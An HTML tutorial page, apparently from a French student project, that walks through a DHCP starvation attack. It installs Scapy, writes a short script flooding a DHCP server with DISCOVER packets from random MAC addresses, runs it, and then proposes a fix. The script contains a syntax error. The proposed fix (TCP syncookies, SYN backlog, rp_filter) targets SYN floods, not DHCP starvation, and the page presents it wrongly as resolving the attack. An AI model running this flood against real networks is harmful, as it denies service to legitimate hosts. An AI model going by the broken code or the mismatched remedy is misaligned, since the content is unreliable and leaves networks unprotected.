<!DOCTYPE html>
<html lang="en">

<head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Autotech - Infrastructure - Attaque DHCP</title>
     <link rel="stylesheet" href="./pages.css">
</head>

<body>
     <section class="section sec1">
          <div class="informations">
               <h1 class="title">Attaque DHCP</h1>

               <p class="description">Attaque DHCP</p>

               <a href="#sec2" class="btn">
                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                         <path d="M16 10L12 14L8 10" stroke="#F2F9F9" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" />
                    </svg>
                    Découvrir l'installation du Attaque DHCP !
               </a>

               <a href="../index.php#infrastructure" class="btn">
                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                         <path d="M20 17.0002V11.4522C20 10.9179 19.9995 10.6506 19.9346 10.4019C19.877 10.1816 19.7825 9.97307 19.6546 9.78464C19.5102 9.57201 19.3096 9.39569 18.9074 9.04383L14.1074 4.84383C13.3608 4.19054 12.9875 3.86406 12.5674 3.73982C12.1972 3.63035 11.8026 3.63035 11.4324 3.73982C11.0126 3.86397 10.6398 4.19014 9.89436 4.84244L5.09277 9.04383C4.69064 9.39569 4.49004 9.57201 4.3457 9.78464C4.21779 9.97307 4.12255 10.1816 4.06497 10.4019C4 10.6506 4 10.9179 4 11.4522V17.0002C4 17.932 4 18.3978 4.15224 18.7654C4.35523 19.2554 4.74432 19.6452 5.23438 19.8482C5.60192 20.0005 6.06786 20.0005 6.99974 20.0005C7.93163 20.0005 8.39808 20.0005 8.76562 19.8482C9.25568 19.6452 9.64467 19.2555 9.84766 18.7654C9.9999 18.3979 10 17.932 10 17.0001V16.0001C10 14.8955 10.8954 14.0001 12 14.0001C13.1046 14.0001 14 14.8955 14 16.0001V17.0001C14 17.932 14 18.3979 14.1522 18.7654C14.3552 19.2555 14.7443 19.6452 15.2344 19.8482C15.6019 20.0005 16.0679 20.0005 16.9997 20.0005C17.9316 20.0005 18.3981 20.0005 18.7656 19.8482C19.2557 19.6452 19.6447 19.2554 19.8477 18.7654C19.9999 18.3978 20 17.932 20 17.0002Z" stroke="#F2F9F9" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" />
                    </svg>
                    Revenir à la page d'accueil
               </a>
          </div>

          <img src="../assets/img/attaque.png" alt="illustation d'une attaque">

     </section>

     <section class="section sec2">
          <img class="left" src="../assets/img/img_org.svg" alt="illustration">
          <div class="right">
               <h1 class="titleSection" style="text-align: start;">Organisation de l'installation/Configuration</h1>

               <p class="descOrg">Nous allons faire le nécessaire pour faire l'attaque et la résoudre.</p>

               <div class="organisation">
                    <ul class="org">
                         <h2 class="titleOrg">Installation</h2>
                         <li>Création du programme python</li>
                    </ul>
                    <ul class="org">
                         <h2 class="titleOrg">Configuration</h2>
                         <li>Démarrage de l'attaque</li>
                         <li>Résolution de l'attaque</li>
                    </ul>
               </div>
          </div>
     </section>

     <section class="section sec3">
          <h1 class="titleSection">Installation de l'attaque</h1>

          <ul class="orgRappel">
               <h2 class="titleOrg">Rappel : Installation</h2>
               <li>Création du programme python</li>
          </ul>

          <div class="infraTitle">
               <h2 class="infraTitleText" style="font-size: var(--size-18);">
                    Création du programme python
               </h2>
          </div>

          <p class="para">Pour crée le programme on installe sur le serveur web, scapy avec la commande : <span class="cmd-spec">$apt install scapy</span></p>
          <p class="para">Ensuite on crée le fichier python avec la commande : <span class="cmd-spec">$touch attaque.py</span></p>
          <p class="para">On écrit le programme : </p>
          <div class="cli">
               <div class="headerCli">
                    <p class="titleCli">attaque.py</p>
               </div>
               <div class="bodyCli">
                    <div class="format">
                         <p class="commande">from scapy.all import *</p>
                         <p class="commande">dhcp_discover = Ether(dst:"64:00:6A:30:CB:A7")/IP(src="192.168.0.101", dst="192.168.0.110")/UDP(sport=68, dport=67)/BOOTP(chaddr=RandMAC())/DHCP(options=[("message-type", "discover"), "end"])</p>
                         <p class="commande">for i in range(30):</p>
                         <p class="commande">sendp(dhcp_discover)</p>
                    </div>
               </div>
          </div>

     </section>

     <section class="section sec3">
          <h1 class="titleSection">Configuration du [element]</h1>

          <ul class="orgRappel">
               <h2 class="titleOrg">Rappel : Configuration</h2>
               <li>Démarrage de l'attaque</li>
               <li>Résolution de l'attaque</li>
          </ul>

          <div class="infraTitle">
               <h2 class="infraTitleText" style="font-size: var(--size-18);">
                    Démarrage de l'attaque
               </h2>
          </div>

          <p class="para">Pour lancer l'attaque on fait : <span class="cmd-spec">$python3 attaque.py</span></p>
          <p class="para">Dans les logs, on peut allors observer une serie de requête DHCPDISCOVER</p>

          <div class="infraTitle">
               <h2 class="infraTitleText" style="font-size: var(--size-18);">
                    Résolution de l'attaque
               </h2>
          </div>

          <p class="para">Pour résoudre l'attaque on fait : </p>

          <div class="cli">
               <div class="headerCli">
                    <p class="titleCli">CLI du serveur dhcp</p>
               </div>

               <div class="bodyCli">
                    <div class="formatCommande">
                         <p class="invite">root@debian-srv~#</p>
                         <p class="commande">echo ‘1’ > /proc/sys/net/ipv4/tcp_syncookies</p>
                         <p class="comment"> % Cette commande active les TCP syncookies, une fonctionnalité de protection contre certaines attaques par déni de service (DoS) comme les attaques SYN flood. </p>
                    </div>
                    <div class="formatCommande">
                         <p class="invite">root@debian-srv~#</p>
                         <p class="commande">echo ‘30’ > /proc/sys/net/ipv4/tcp_max_syn_backlog</p>
                         <p class="comment"> % Cette commande augmente le nombre maximum de connexions SYN non confirmées qui peuvent être maintenues en file d'attente.</p>
                    </div>
                    <div class="formatCommande">
                         <p class="invite">root@debian-srv~#</p>
                         <p class="commande">echo ‘1’ > /proc/sys/net/ipv4/conf/all/rp_filter</p>
                         <p class="comment"> % Cette commande active le Reverse Path Filtering (filtrage de chemin inverse) pour toutes les interfaces réseau.</p>
                    </div>
               </div>
          </div>

          <div class="cli">
               <div class="headerCli">
                    <p class="titleCli">/etc/sysctl.conf</p>
               </div>
               <div class="bodyCli">
                    <div class="format">
                         <p class="commande">net.ipv4.tcp_syncookies =1</p>
                         <p class="commande">net.ipv4.conf.all.rp_filter = 1</p>
                         <p class="commande">net.ipv4.tcp_max_syn_backlog = 30</p>
                    </div>
               </div>
          </div>
     </section>
</body>

</html>